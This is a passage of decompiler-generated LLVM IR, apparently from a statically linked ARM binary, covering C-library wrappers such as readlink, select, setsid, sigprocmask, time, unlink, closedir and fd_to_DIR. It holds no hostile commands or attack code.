  %v4_10ac4 = sext i16 %v3_10ac4 to i32
  %v0_10ac8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10ac8 = sub i32 0, %v0_10ac8
  store i32 %v1_10ac8, i32* %r2.global-to-local, align 4
  %v3_10acc = add i32 %v4_10ac4, %v0_10ac0
  %v4_10acc = inttoptr i32 %v3_10acc to i32*
  store i32 %v1_10ac8, i32* %v4_10acc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10ad4.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10ad4

dec_label_pc_10ad4:                               ; preds = %entry, %dec_label_pc_10abc
  %v1_10ad8 = phi i32 [ %v0_10aac, %entry ], [ -1, %dec_label_pc_10abc ]
  %v2_10ad4 = phi i32 [ %v3_10a9c, %entry ], [ %v2_10ad4.pre, %dec_label_pc_10abc ]
  store i32 %v2_10ad4, i32* @r4, align 4
  ret i32 %v1_10ad8

; uselistorder directives
  uselistorder i32 %v0_10aac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ad4, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ae0 = load i32, i32* @r7, align 4
  store i32 %v3_10ae0, i32* %stack_var_-8, align 4
  %v0_10aec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10aec, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10aec, -4095
  br i1 %tmp, label %dec_label_pc_10b14, label %dec_label_pc_10afc

dec_label_pc_10afc:                               ; preds = %entry
  %v0_10b00 = call i32 @__aeabi_read_tp()
  %v3_10b04 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10b04 = sext i16 %v3_10b04 to i32
  store i32 %v4_10b04, i32* @r3, align 4
  %v0_10b08 = load i32, i32* @r2, align 4
  %v1_10b08 = sub i32 0, %v0_10b08
  store i32 %v1_10b08, i32* @r2, align 4
  %v3_10b0c = add i32 %v4_10b04, %v0_10b00
  %v4_10b0c = inttoptr i32 %v3_10b0c to i32*
  store i32 %v1_10b08, i32* %v4_10b0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10b14.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10b14

dec_label_pc_10b14:                               ; preds = %entry, %dec_label_pc_10afc
  %v1_10b18 = phi i32 [ %v0_10aec, %entry ], [ -1, %dec_label_pc_10afc ]
  %v2_10b14 = phi i32 [ %v3_10ae0, %entry ], [ %v2_10b14.pre, %dec_label_pc_10afc ]
  store i32 %v2_10b14, i32* @r7, align 4
  ret i32 %v1_10b18

; uselistorder directives
  uselistorder i32 %v0_10aec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b14, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10b20 = load i32, i32* @r4, align 4
  store i32 %v3_10b20, i32* %stack_var_-12, align 4
  %v0_10b30 = load i32, i32* @r0, align 4
  store i32 %v0_10b30, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10b30, -4095
  br i1 %tmp, label %dec_label_pc_10b58, label %dec_label_pc_10b40

dec_label_pc_10b40:                               ; preds = %entry
  %v0_10b44 = call i32 @__aeabi_read_tp()
  %v3_10b48 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10b48 = sext i16 %v3_10b48 to i32
  %v0_10b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_10b4c = sub i32 0, %v0_10b4c
  store i32 %v1_10b4c, i32* %r2.global-to-local, align 4
  %v3_10b50 = add i32 %v4_10b48, %v0_10b44
  %v4_10b50 = inttoptr i32 %v3_10b50 to i32*
  store i32 %v1_10b4c, i32* %v4_10b50, align 4
  %v2_10b58.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10b58

dec_label_pc_10b58:                               ; preds = %entry, %dec_label_pc_10b40
  %v1_10b5c = phi i32 [ %v0_10b30, %entry ], [ -1, %dec_label_pc_10b40 ]
  %v2_10b58 = phi i32 [ %v3_10b20, %entry ], [ %v2_10b58.pre, %dec_label_pc_10b40 ]
  store i32 %v2_10b58, i32* @r4, align 4
  ret i32 %v1_10b5c

; uselistorder directives
  uselistorder i32 %v0_10b30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10b58, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10b64 = load i32, i32* @r4, align 4
  store i32 %v3_10b64, i32* %stack_var_-28, align 4
  %v6_10b64 = load i32, i32* @r5, align 4
  %v9_10b64 = load i32, i32* @r6, align 4
  %v12_10b64 = load i32, i32* @r7, align 4
  %v15_10b64 = load i32, i32* @r8, align 4
  %v18_10b64 = load i32, i32* @sl, align 4
  %v21_10b64 = load i32, i32* @lr, align 4
  %v4_10b74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 12776) to i32*), align 4
  %v2_10b7c = icmp eq i32 %v4_10b74, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10b7c, label %dec_label_pc_10b98, label %entry.dec_label_pc_10ba4_crit_edge

entry.dec_label_pc_10ba4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10ba4

dec_label_pc_10b98:                               ; preds = %entry
  store i32 %v3_10b64, i32* @r4, align 4
  store i32 %v9_10b64, i32* @r6, align 4
  store i32 %v12_10b64, i32* @r7, align 4
  store i32 %v15_10b64, i32* @r8, align 4
  store i32 %v18_10b64, i32* %sl.global-to-local, align 4
  %v0_10ba0 = call i32 @__syscall_select()
  br label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %entry.dec_label_pc_10ba4_crit_edge, %dec_label_pc_10b98
  %v0_10ba4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10ba4, i32* @r5, align 4
  %v0_10bb8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10bb8, i32* @r0, align 4
  %v0_10bc0 = call i32 @__syscall_select()
  store i32 %v0_10bc0, i32* @r4, align 4
  %v0_10bc8 = load i32, i32* @r5, align 4
  %v1_10bcc = call i32 @__libc_disable_asynccancel(i32 %v0_10bc8)
  %v0_10bd0 = load i32, i32* @r4, align 4
  %v2_10bd8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10bd8, i32* @r4, align 4
  store i32 %v6_10b64, i32* @r5, align 4
  store i32 %v9_10b64, i32* @r6, align 4
  store i32 %v12_10b64, i32* @r7, align 4
  store i32 %v15_10b64, i32* @r8, align 4
  store i32 %v18_10b64, i32* @sl, align 4
  store i32 %v21_10b64, i32* @lr, align 4
  ret i32 %v0_10bd0

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10ba4, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10be8 = load i32, i32* @r7, align 4
  store i32 %v3_10be8, i32* %stack_var_-8, align 4
  %v0_10bf4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10bf4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10bf4, -4095
  br i1 %tmp, label %dec_label_pc_10c1c, label %dec_label_pc_10c04

dec_label_pc_10c04:                               ; preds = %entry
  %v0_10c08 = call i32 @__aeabi_read_tp()
  %v3_10c0c = load i16, i16* @global_var_216ec.303, align 2
  %v4_10c0c = sext i16 %v3_10c0c to i32
  %v0_10c10 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c10 = sub i32 0, %v0_10c10
  store i32 %v1_10c10, i32* %r2.global-to-local, align 4
  %v3_10c14 = add i32 %v4_10c0c, %v0_10c08
  %v4_10c14 = inttoptr i32 %v3_10c14 to i32*
  store i32 %v1_10c10, i32* %v4_10c14, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %entry, %dec_label_pc_10c04
  %v1_10c20 = phi i32 [ %v0_10bf4, %entry ], [ -1, %dec_label_pc_10c04 ]
  %v2_10c1c = phi i32 [ %v3_10be8, %entry ], [ %v2_10c1c.pre, %dec_label_pc_10c04 ]
  store i32 %v2_10c1c, i32* @r7, align 4
  ret i32 %v1_10c20

; uselistorder directives
  uselistorder i32 %v0_10bf4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c1c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10c2c = icmp eq i32* %arg2, null
  br i1 %v2_10c2c, label %dec_label_pc_10c70, label %dec_label_pc_10c40

dec_label_pc_10c40:                               ; preds = %entry
  %v2_10c40 = load i32, i32* %arg2, align 4
  %v1_10c44 = icmp slt i32 %v2_10c40, 0
  br i1 %v1_10c44, label %dec_label_pc_10c58, label %dec_label_pc_10c4c

dec_label_pc_10c4c:                               ; preds = %dec_label_pc_10c40
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_10c4c = load i32, i32* %.pre3, align 4
  %v1_10c50 = urem i32 %v3_10c4c, 2
  %v2_10c50 = icmp eq i32 %v1_10c50, 0
  br i1 %v2_10c50, label %dec_label_pc_10c70, label %dec_label_pc_10c58

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c40, %dec_label_pc_10c4c
  %v2_10c58 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_10c58 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_10c70

dec_label_pc_10c70:                               ; preds = %dec_label_pc_10c4c, %entry, %dec_label_pc_10c58
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10ca4, label %dec_label_pc_10c8c

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10c70
  %v1_10c90 = sub i32 0, %arg1
  %v3_10c94 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10c94 = sext i16 %v3_10c94 to i32
  %v0_10c98 = call i32 @__aeabi_read_tp()
  %v3_10c9c = add i32 %v4_10c94, %v0_10c98
  %v4_10c9c = inttoptr i32 %v3_10c9c to i32*
  store i32 %v1_10c90, i32* %v4_10c9c, align 4
  br label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c70, %dec_label_pc_10c8c
  %v1_10cac = phi i32 [ %arg1, %dec_label_pc_10c70 ], [ -1, %dec_label_pc_10c8c ]
  ret i32 %v1_10cac

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10c70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c58, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10cb8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10cc8 = call i32 @gettimeofday(i32 %v2_10cb8, i32 0)
  %v2_10ccc = load i32, i32* %stack_var_-16, align 4
  %v2_10cd0 = icmp eq i32* %arg1, null
  br i1 %v2_10cd0, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10ccc, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10ccc

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce4 = load i32, i32* @r7, align 4
  store i32 %v3_10ce4, i32* %stack_var_-8, align 4
  %v0_10cf0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10cf0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10cf0, -4095
  br i1 %tmp, label %dec_label_pc_10d18, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %entry
  %v0_10d04 = call i32 @__aeabi_read_tp()
  %v3_10d08 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10d08 = sext i16 %v3_10d08 to i32
  %v0_10d0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10d0c = sub i32 0, %v0_10d0c
  store i32 %v1_10d0c, i32* %r2.global-to-local, align 4
  %v3_10d10 = add i32 %v4_10d08, %v0_10d04
  %v4_10d10 = inttoptr i32 %v3_10d10 to i32*
  store i32 %v1_10d0c, i32* %v4_10d10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %entry, %dec_label_pc_10d00
  %v1_10d1c = phi i32 [ %v0_10cf0, %entry ], [ -1, %dec_label_pc_10d00 ]
  %v2_10d18 = phi i32 [ %v3_10ce4, %entry ], [ %v2_10d18.pre, %dec_label_pc_10d00 ]
  store i32 %v2_10d18, i32* @r7, align 4
  ret i32 %v1_10d1c

; uselistorder directives
  uselistorder i32 %v0_10cf0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d18, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10d24 = load i32, i32* @r4, align 4
  store i32 %v3_10d24, i32* %stack_var_-24, align 4
  %v9_10d24 = load i32, i32* @r6, align 4
  %v12_10d24 = load i32, i32* @r7, align 4
  %v15_10d24 = load i32, i32* @r8, align 4
  %v18_10d24 = load i32, i32* @lr, align 4
  %v2_10d28 = load i32, i32* %arg1, align 4
  store i32 %v2_10d28, i32* %r3.global-to-local, align 4
  %v3_10d30 = icmp eq i32 %v2_10d28, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  br i1 %v3_10d30, label %dec_label_pc_10d44, label %dec_label_pc_10d60

dec_label_pc_10d44:                               ; preds = %entry
  store i32 67992, i32* %r2.global-to-local, align 4
  %v0_10d48 = call i32 @__aeabi_read_tp()
  %v3_10d4c = load i16, i16* @global_var_216ec.303, align 2
  %v4_10d4c = sext i16 %v3_10d4c to i32
  store i32 %v4_10d4c, i32* %r2.global-to-local, align 4
  %v0_10d50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10d50, i32* %r1.global-to-local, align 4
  %v1_10d54 = add i32 %v0_10d50, 10
  store i32 %v1_10d54, i32* %r3.global-to-local, align 4
  %v3_10d58 = add i32 %v4_10d4c, %v0_10d48
  %v4_10d58 = inttoptr i32 %v3_10d58 to i32*
  store i32 %v1_10d54, i32* %v4_10d58, align 4
  %v0_10e08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10d60:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_10d64 = add i32 %tmp, 24
  store i32 %v1_10d64, i32* %r2.global-to-local, align 4
  %v4_10d6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), align 4
  store i32 %v4_10d6c, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10d78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10d78)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10d90 = load i32, i32* @r6, align 4
  %v2_10d90 = add i32 %v0_10d90, 16
  %v3_10d90 = inttoptr i32 %v2_10d90 to i32*
  %v4_10d90 = load i32, i32* %v3_10d90, align 4
  call void @__pseudo_branch(i32 %v4_10d90)
  %v0_10d9c = load i32, i32* @r7, align 4
  %v1_10d9c = inttoptr i32 %v0_10d9c to i32*
  %v2_10d9c = load i32, i32* %v1_10d9c, align 4
  store i32 %v2_10d9c, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_10dac = load i32, i32* @r8, align 4
  store i32 %v0_10dac, i32* %v1_10d9c, align 4
  %v0_10db0 = load i32, i32* @r6, align 4
  %v1_10db0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10db0 = add i32 %v1_10db0, %v0_10db0
  %v3_10db0 = inttoptr i32 %v2_10db0 to i32*
  %v4_10db0 = load i32, i32* %v3_10db0, align 4
  store i32 ptrtoint (i32* @global_var_10dbc.333 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10db0)
  %v0_10dbc = load i32, i32* @r7, align 4
  %v1_10dbc = add i32 %v0_10dbc, 12
  %v2_10dbc = inttoptr i32 %v1_10dbc to i32*
  %v3_10dbc = load i32, i32* %v2_10dbc, align 4
  store i32 %v3_10dbc, i32* @r0, align 4
  %v0_10dc0 = call i32 @free()
  %v0_10dc4 = load i32, i32* @r7, align 4
  store i32 %v0_10dc4, i32* @r0, align 4
  %v0_10dc8 = call i32 @free()
  %v0_10dd0 = load i32, i32* @r4, align 4
  store i32 %v0_10dd0, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_10dd0, -4095
  br i1 %tmp11, label %dec_label_pc_10e04, label %dec_label_pc_10dec

dec_label_pc_10dec:                               ; preds = %dec_label_pc_10d60
  store i32 67824, i32* %r3.global-to-local, align 4
  %v0_10df0 = call i32 @__aeabi_read_tp()
  %v3_10df4 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10df4 = sext i16 %v3_10df4 to i32
  store i32 %v4_10df4, i32* %r3.global-to-local, align 4
  %v0_10df8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10df8 = sub i32 0, %v0_10df8
  store i32 %v1_10df8, i32* %r2.global-to-local, align 4
  %v3_10dfc = add i32 %v4_10df4, %v0_10df0
  %v4_10dfc = inttoptr i32 %v3_10dfc to i32*
  store i32 %v1_10df8, i32* %v4_10dfc, align 4
  %v0_10e00 = load i32, i32* @r8, align 4
  br label %dec_label_pc_10e04

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10dec
  %v0_10e04 = phi i32 [ %v0_10dd0, %dec_label_pc_10d60 ], [ %v0_10e00, %dec_label_pc_10dec ]
  store i32 %v0_10e04, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_10d44, %dec_label_pc_10e04
  %v0_10e08 = phi i32 [ %v0_10e08.pre, %dec_label_pc_10d44 ], [ %v0_10e04, %dec_label_pc_10e04 ]
  %v2_10e10 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e10, i32* @r4, align 4
  store i32 %v9_10d24, i32* @r6, align 4
  store i32 %v12_10d24, i32* @r7, align 4
  store i32 %v15_10d24, i32* @r8, align 4
  store i32 %v18_10d24, i32* @lr, align 4
  ret i32 %v0_10e08

; uselistorder directives
  uselistorder i32 %v0_10dd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e08, { 1, 0 }
  uselistorder label %dec_label_pc_10e04, { 1, 0 }
}

define i32 @function_10e20(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10e20:
  %v0_10e20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10e20, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10e20
  store i32 0, i32* %arg2, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10e20, %bb
  %v8_10e30 = phi i32 [ %arg1, %dec_label_pc_10e20 ], [ 0, %bb ]
  ret i32 %v8_10e30

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10e34 = load i32, i32* @r4, align 4
  %v6_10e34 = load i32, i32* @r5, align 4
  %v9_10e34 = load i32, i32* @r6, align 4
  %v12_10e34 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_10e48 = call i32 @malloc(i32 48)
  %v2_10e50 = icmp eq i32 %v1_10e48, 0
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  br i1 %v2_10e50, label %bb, label %dec_label_pc_10e60

bb:                                               ; preds = %entry
  br label %dec_label_pc_10eec

dec_label_pc_10e60:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10e64 = load i32, i32* @r4, align 4
  %v2_10e64 = icmp ugt i32 %v0_10e64, 511
  %v2_10e68 = add i32 %v1_10e48, 4
  %v3_10e68 = inttoptr i32 %v2_10e68 to i32*
  store i32 0, i32* %v3_10e68, align 4
  %v0_10e6c = load i32, i32* %r3.global-to-local, align 4
  %v2_10e6c = add i32 %v1_10e48, 16
  %v3_10e6c = inttoptr i32 %v2_10e6c to i32*
  store i32 %v0_10e6c, i32* %v3_10e6c, align 4
  %v0_10e70 = load i32, i32* %r3.global-to-local, align 4
  %v2_10e70 = add i32 %v1_10e48, 8
  %v3_10e70 = inttoptr i32 %v2_10e70 to i32*
  store i32 %v0_10e70, i32* %v3_10e70, align 4
  br i1 %v2_10e64, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10e60
  %v0_10e782 = load i32, i32* @r4, align 4
  %v2_10e783 = add i32 %v1_10e48, 20
  %v3_10e784 = inttoptr i32 %v2_10e783 to i32*
  store i32 %v0_10e782, i32* %v3_10e784, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10e60
  %v1_10e74 = load i32, i32* %r3.global-to-local, align 4
  %v2_10e74 = add i32 %v1_10e74, 512
  store i32 %v2_10e74, i32* %r3.global-to-local, align 4
  %v0_10e78 = load i32, i32* @r4, align 4
  %v2_10e78 = add i32 %v1_10e48, 20
  %v3_10e78 = inttoptr i32 %v2_10e78 to i32*
  store i32 %v0_10e78, i32* %v3_10e78, align 4
  %v1_10e7c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10e7c, i32* %v3_10e78, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_10e48, i32* @r5, align 4
  %v0_10e84 = load i32, i32* @r7, align 4
  %v2_10e84 = inttoptr i32 %v1_10e48 to i32*
  store i32 %v0_10e84, i32* %v2_10e84, align 4
  %v0_10e88 = load i32, i32* @r5, align 4
  %v1_10e88 = add i32 %v0_10e88, 20
  %v2_10e88 = inttoptr i32 %v1_10e88 to i32*
  %v3_10e88 = load i32, i32* %v2_10e88, align 4
  store i32 %v3_10e88, i32* %r1.global-to-local, align 4
  %v2_10e90 = call i32 @calloc(i32 1, i32 %v3_10e88)
  %v2_10e94 = icmp eq i32 %v2_10e90, 0
  store i32 %v2_10e90, i32* @r4, align 4
  %v1_10e9c = load i32, i32* @r5, align 4
  %v2_10e9c = add i32 %v1_10e9c, 12
  %v3_10e9c = inttoptr i32 %v2_10e9c to i32*
  store i32 %v2_10e90, i32* %v3_10e9c, align 4
  br i1 %v2_10e94, label %dec_label_pc_10ea4, label %dec_label_pc_10eb4

dec_label_pc_10ea4:                               ; preds = %bb17
  %v0_10ea4 = load i32, i32* @r5, align 4
  store i32 %v0_10ea4, i32* @r0, align 4
  %v0_10ea8 = call i32 @free()
  %v0_10eac = load i32, i32* @r4, align 4
  br label %dec_label_pc_10eec

dec_label_pc_10eb4:                               ; preds = %bb17
  %v0_10eb8 = load i32, i32* @r6, align 4
  %v2_10eb8 = add i32 %v0_10eb8, -34036
  store i32 %v2_10eb8, i32* %r3.global-to-local, align 4
  %v1_10ec0 = inttoptr i32 %v2_10eb8 to i32*
  %v2_10ec0 = load i32, i32* %v1_10ec0, align 4
  %v3_10ec0 = add i32 %v0_10eb8, -34032
  %v4_10ec0 = inttoptr i32 %v3_10ec0 to i32*
  %v5_10ec0 = load i32, i32* %v4_10ec0, align 4
  store i32 %v5_10ec0, i32* %r1.global-to-local, align 4
  %v6_10ec0 = add i32 %v0_10eb8, -34028
  %v7_10ec0 = inttoptr i32 %v6_10ec0 to i32*
  %v8_10ec0 = load i32, i32* %v7_10ec0, align 4
  store i32 %v8_10ec0, i32* %r2.global-to-local, align 4
  %v9_10ec0 = add i32 %v0_10eb8, -34024
  %v10_10ec0 = inttoptr i32 %v9_10ec0 to i32*
  %v11_10ec0 = load i32, i32* %v10_10ec0, align 4
  store i32 %v11_10ec0, i32* %r3.global-to-local, align 4
  %v12_10ec0 = add i32 %v0_10eb8, -34020
  %v1_10ecc = inttoptr i32 %v12_10ec0 to i32*
  %v2_10ecc = load i32, i32* %v1_10ecc, align 4
  %v3_10ecc = add i32 %v0_10eb8, -34016
  %v4_10ecc = inttoptr i32 %v3_10ecc to i32*
  %v5_10ecc = load i32, i32* %v4_10ecc, align 4
  store i32 %v2_10ecc, i32* %stack_var_-32, align 4
  store i32 %v5_10ec0, i32* %r1.global-to-local, align 4
  store i32 %v8_10ec0, i32* %r2.global-to-local, align 4
  store i32 %v11_10ec0, i32* %r3.global-to-local, align 4
  %v0_10edc = load i32, i32* @r5, align 4
  %v1_10edc = add i32 %v0_10edc, 24
  %v1_10ee0 = inttoptr i32 %v1_10edc to i32*
  store i32 %v2_10ec0, i32* %v1_10ee0, align 4
  %v3_10ee0 = add i32 %v0_10edc, 28
  %v4_10ee0 = inttoptr i32 %v3_10ee0 to i32*
  %v5_10ee0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10ee0, i32* %v4_10ee0, align 4
  %v6_10ee0 = add i32 %v0_10edc, 32
  %v7_10ee0 = inttoptr i32 %v6_10ee0 to i32*
  %v8_10ee0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10ee0, i32* %v7_10ee0, align 4
  %v9_10ee0 = add i32 %v0_10edc, 36
  %v10_10ee0 = inttoptr i32 %v9_10ee0 to i32*
  %v11_10ee0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10ee0, i32* %v10_10ee0, align 4
  %v12_10ee0 = add i32 %v0_10edc, 40
  %v2_10ee4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_10ecc, i32* %r1.global-to-local, align 4
  %v1_10ee8 = inttoptr i32 %v12_10ee0 to i32*
  store i32 %v2_10ee4, i32* %v1_10ee8, align 4
  %v3_10ee8 = add i32 %v0_10edc, 44
  %v4_10ee8 = inttoptr i32 %v3_10ee8 to i32*
  %v5_10ee8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10ee8, i32* %v4_10ee8, align 4
  %v0_10eec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %bb, %dec_label_pc_10ea4, %dec_label_pc_10eb4
  %v0_10eec = phi i32 [ 0, %bb ], [ %v0_10eac, %dec_label_pc_10ea4 ], [ %v0_10eec.pre, %dec_label_pc_10eb4 ]
  store i32 %v3_10e34, i32* @r4, align 4
  store i32 %v6_10e34, i32* @r5, align 4
  store i32 %v9_10e34, i32* @r6, align 4
  store i32 %v12_10e34, i32* @r7, align 4
  ret i32 %v0_10eec

; uselistorder directives
  uselistorder i32 %v2_10e90, { 1, 0, 2 }
  uselistorder i32 %v1_10e48, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_10eec, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_10f04 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_10f0c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
